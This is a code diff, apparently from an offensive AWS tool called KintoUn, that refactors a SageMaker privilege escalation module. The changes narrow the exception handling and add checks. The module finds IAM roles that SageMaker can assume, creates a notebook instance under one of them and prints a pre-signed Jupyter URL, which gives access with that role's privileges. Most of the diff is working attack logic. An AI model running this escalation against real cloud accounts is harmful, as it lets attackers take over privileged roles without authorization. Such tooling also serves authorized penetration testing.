@@ -1,10 +1,5 @@
-import json
-import sys
 from time import sleep
-from sympy import EX
-import boto3
-import datetime 
-from dateutil.tz import tzutc
+import botocore
 from colorama import Fore, Style
 from modules.enumeration import iam_enumerate_assume_role
 from functions import create_client
@@ -32,11 +27,14 @@ def help():
     print("\tto run anyway when prompet and all should be fine.")
     print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
 
-def check_permissions(selected_session):
+def check_permissions(selected_session=None):
+    if not selected_session:
+        return False
+
     try:
         permission_results_file = "./results/{}_session_data/iam/iam_enumerate_permissions_results.json".format(selected_session)
         results_file = open(permission_results_file, "r").read()
-    except:
+    except OSError:
         print(Fore.RED + "[-] No permission results found...make sure to run the 'iam_enumerate_permissions' module to enumerate permissions..." + Style.RESET_ALL)
         return False
 
@@ -58,8 +56,8 @@ def check_assumable_roles(botoconfig, session):
                 for principal in role['AssumeRolePolicyDocument']['Statement']:
                     if principal['Principal']['Service'] == 'sagemaker.amazonaws.com':
                         sage_maker_assumable_roles.append(role['Arn'])
-        except:
-            next
+        except (KeyError, TypeError):
+            continue
     
     return sage_maker_assumable_roles
 
@@ -98,7 +96,7 @@ def create_notebook(botoconfig, session, attack_role):
         )
         return notebook_arn, client, region
 
-    except Exception as e:
+    except botocore.exceptions.ClientError as e:
         print("[-] It was "+Fore.RED+"not possible "+Style.RESET_ALL+"to create a notebook...please check if you have the apropriate permissions")
         print(e)
         return False
@@ -123,47 +121,48 @@ def create_presigned_url(sagemaker_client):
 
         return signed_url
 
-    except Exception as e:
+    except botocore.exceptions.ClientError as e:
         print(e)
 
         return False
 
-def main(botoconfig, session, selected_session):
+def main(botoconfig, session, selected_session=None):
     print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
     print("[+] Starting SageMaker privilege escalation module...")
     print("[+] Checking for required permissions...")
 
-    try:
-        required_permissions = check_permissions(selected_session)
+    required_permissions = check_permissions(selected_session)
 
-        if not required_permissions:
-            option = input("\n[-] KintoUn was "+Fore.RED+"not able"+Style.RESET_ALL+" to identity the required permissions...\n[-] This can be due to generic permissions like '*'...\n\nDo you want to continue executing the module? [y/N]: ")
-            if not option or option.lower() == "n":
-                print("[-] Exiting module...")
-                return 
-       
-        print("[+] Checking for roles that can be assumed by SageMaker...")
-        assumable_roles = check_assumable_roles(botoconfig, session)
-        attack_role = parse_assumable_role_option(assumable_roles)
+    if not required_permissions:
+        option = input("\n[-] KintoUn was "+Fore.RED+"not able"+Style.RESET_ALL+" to identity the required permissions...\n[-] This can be due to generic permissions like '*'...\n\nDo you want to continue executing the module? [y/N]: ")
+        if not option or option.lower() == "n":
+            print("[-] Exiting module...")
+            return
 
-        print("[+] Using the following role to create notebook: "+Fore.GREEN+"{}".format(attack_role)+Style.RESET_ALL)
-        notebook_arn, sagemaker_client, region = create_notebook(botoconfig, session, attack_role)
-        print("[+] Notebook Arn: "+Fore.GREEN+"{}".format(notebook_arn['NotebookInstanceArn'])+Style.RESET_ALL)
-
-        print("[+] Waiting for notebook to activate...this can take some time...")
-        sagemaker_client = session.client('sagemaker', config=botoconfig, region_name=region)
-        while True:
-            token = check_notebook_status(sagemaker_client)
-            if token:
-                break
-            else:
-                sleep(10)
-
-        print("[+] Creating pre-signed url for jupyter notebook...")
-        signed_url = create_presigned_url(sagemaker_client)
-        print("[+] Signed Url: "+Fore.GREEN+"{}".format(signed_url['AuthorizedUrl'])+Style.RESET_ALL)
-        
-    except Exception as e:
-        print(e)
-
+    print("[+] Checking for roles that can be assumed by SageMaker...")
+    assumable_roles = check_assumable_roles(botoconfig, session)
+    attack_role = parse_assumable_role_option(assumable_roles)
+    if not attack_role:
         return False
+
+    print("[+] Using the following role to create notebook: "+Fore.GREEN+"{}".format(attack_role)+Style.RESET_ALL)
+    notebook_result = create_notebook(botoconfig, session, attack_role)
+    if not notebook_result:
+        return False
+
+    notebook_arn, sagemaker_client, region = notebook_result
+    print("[+] Notebook Arn: "+Fore.GREEN+"{}".format(notebook_arn['NotebookInstanceArn'])+Style.RESET_ALL)
+
+    print("[+] Waiting for notebook to activate...this can take some time...")
+    sagemaker_client = session.client('sagemaker', config=botoconfig, region_name=region)
+    while True:
+        token = check_notebook_status(sagemaker_client)
+        if token:
+            break
+        sleep(10)
+
+    print("[+] Creating pre-signed url for jupyter notebook...")
+    signed_url = create_presigned_url(sagemaker_client)
+    if not signed_url:
+        return False
+    print("[+] Signed Url: "+Fore.GREEN+"{}".format(signed_url['AuthorizedUrl'])+Style.RESET_ALL)
